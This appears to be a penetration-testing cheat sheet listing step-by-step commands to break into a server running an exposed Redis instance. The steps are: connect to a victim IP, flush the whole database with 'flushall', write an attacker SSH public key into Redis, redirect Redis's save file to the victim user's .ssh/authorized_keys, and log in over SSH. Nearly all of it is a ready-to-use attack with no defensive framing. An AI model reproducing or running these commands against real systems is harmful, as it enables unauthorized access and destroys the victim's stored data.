### Redis:
Data structure store, used as a database, cache and message broker. It supports data structures such as strings, hashes, lists, sets, sorted sets with range queries, bitmaps, hyperloglogs, geospatial indexes with radius queries and streams

#### nmap

#### telnet
- telnet <victim_ip> <redis_port_usually_6379>

#### Generate SSH key
- ssh-keygen -t rsa -C <youremail>@<email_domain>

### Add random data before and after our key:
- (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt

### Connect to redis 
- redis-cli -h <victim_ip>

### Flush keys
- redis-cli -h <victim_ip> -p 6379 flushall

### Set our keys into the database
- cat key.txt | redis-cli -h <victim_ip> -p 6379 -x set bb

### Check the current folder 
- config get dir

### Change out directory
- config set dir /<victim_user_name>/.ssh/

### Change name of our file
- set dbfilename "authorized_keys"

### Save changes
- save

### Try to login into server via SSH
